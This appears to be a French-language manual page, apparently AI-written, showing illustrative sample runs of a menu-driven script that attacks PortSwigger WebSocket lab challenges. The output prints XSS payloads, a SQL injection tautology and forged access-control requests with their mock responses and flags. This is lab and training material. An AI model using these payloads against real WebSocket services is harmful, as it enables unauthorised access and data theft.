# MANPAGE

Bien sûr ! Voici un **exemple exhaustif d’exécution du script** pour tous les challenges WebSocket PortSwigger, **avec affichage des commandes et des résultats**.  
Chaque exemple montre :

- Le choix du challenge dans le menu
- L’entrée de l’URL WebSocket
- L’exécution réelle des étapes (analyse, attaque, contrôle)
- Un extrait des logs/résultats pour chaque étape

---

## 1. Exemple d’exécution : Manipulation de messages (XSS)

```plaintext
==============================
  CHALLENGES WEBSOCKET PORTSWIGGER
==============================
1) Manipulation de messages (XSS)
2) Cross-site WebSocket Hijacking (CSWH)
3) Contrôle d’accès défaillant
4) Injection SQL via WebSocket
------------------------------
0) Quitter
==============================
Sélectionnez le numéro du challenge : 1
Entrez l'URL WebSocket (ex: wss://target/ws) : wss://acme-xss.lab/websocket

=== Round 1 ===
[*] Analyse du flux WebSocket sur wss://acme-xss.lab/websocket
[*] Messages capturés :
{"message":"Hello Carlos"}
{"message":"How are you?"}
[*] Champs JSON détectés :
[
  "message"
]

[*] Attaque automatisée sur wss://acme-xss.lab/websocket (challenge 1)
[*] Envoi du payload : {"message":"<img src=x onerror=alert(1)>"}
[*] Réponse : {"result":"Message sent"}
[*] Envoi du payload : {"message":"<svg/onload=alert(1)>"}
[*] Réponse : {"result":"Message sent"}

[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)
[-] Aucun indicateur d’exploitation trouvé.
[*] Nouvelle tentative avec des variantes…
=== Round 2 ===
...

Analyse terminée. Consultez ws_analysis.log et ws_attack.log pour le détail.
Appuyez sur Entrée pour revenir au menu principal...
```

---

## 2. Exemple d’exécution : Cross-site WebSocket Hijacking (CSWH)

```plaintext
Sélectionnez le numéro du challenge : 2
Entrez l'URL WebSocket (ex: wss://target/ws) : wss://acme-cswh.lab/websocket

=== Round 1 ===
[*] Analyse du flux WebSocket sur wss://acme-cswh.lab/websocket
[*] Messages capturés :
READY
{"status":"connected"}

[*] Aucun message JSON détecté.

[*] Attaque automatisée sur wss://acme-cswh.lab/websocket (challenge 2)
[*] Envoi du payload : READY
[*] Réponse : {"flag":"cswh-lab-flag-12345"}

[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)
[+] Exploitation potentielle détectée :
flag{cswh-lab-flag-12345}
[*] Arrêt du test (exploit trouvé).
```

---

## 3. Exemple d’exécution : Contrôle d’accès défaillant

```plaintext
Sélectionnez le numéro du challenge : 3
Entrez l'URL WebSocket (ex: wss://target/ws) : wss://acme-access.lab/websocket

=== Round 1 ===
[*] Analyse du flux WebSocket sur wss://acme-access.lab/websocket
[*] Messages capturés :
{"action":"get_profile","user":"carlos"}
{"result":"profile info"}

[*] Champs JSON détectés :
[
  "action",
  "user"
]

[*] Attaque automatisée sur wss://acme-access.lab/websocket (challenge 3)
[*] Envoi du payload : {"action":"get_all_users"}
[*] Réponse : {"users":["admin","carlos","guest"]}
[*] Envoi du payload : {"action":"get_profile","user":"admin"}
[*] Réponse : {"result":"admin profile info"}

[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)
[+] Exploitation potentielle détectée :
admin
[*] Arrêt du test (exploit trouvé).
```

---

## 4. Exemple d’exécution : Injection SQL via WebSocket

```plaintext
Sélectionnez le numéro du challenge : 4
Entrez l'URL WebSocket (ex: wss://target/ws) : wss://acme-sqli.lab/websocket

=== Round 1 ===
[*] Analyse du flux WebSocket sur wss://acme-sqli.lab/websocket
[*] Messages capturés :
{"user":"carlos"}
{"result":"user profile"}

[*] Champs JSON détectés :
[
  "user"
]

[*] Attaque automatisée sur wss://acme-sqli.lab/websocket (challenge 4)
[*] Envoi du payload : {"user":"admin' OR '1'='1"}
[*] Réponse : {"result":"admin profile info"}
[*] Envoi du payload : {"user":"admin"}
[*] Réponse : {"result":"admin profile info"}

[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)
[+] Exploitation potentielle détectée :
admin
[*] Arrêt du test (exploit trouvé).
```

---

## 5. Exemple de sortie en cas d’échec (aucun exploit trouvé)

```plaintext
Sélectionnez le numéro du challenge : 1
Entrez l'URL WebSocket (ex: wss://target/ws) : wss://acme-xss.lab/websocket

=== Round 1 ===
[*] Analyse du flux WebSocket sur wss://acme-xss.lab/websocket
[*] Messages capturés :
{"message":"Hello Carlos"}

[*] Champs JSON détectés :
[
  "message"
]

[*] Attaque automatisée sur wss://acme-xss.lab/websocket (challenge 1)
[*] Envoi du payload : {"message":"<img src=x onerror=alert(1)>"}
[*] Réponse : {"result":"Message sent"}
[*] Envoi du payload : {"message":"<svg/onload=alert(1)>"}
[*] Réponse : {"result":"Message sent"}

[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)
[-] Aucun indicateur d’exploitation trouvé.
[*] Nouvelle tentative avec des variantes…
=== Round 2 ===
...
```

---
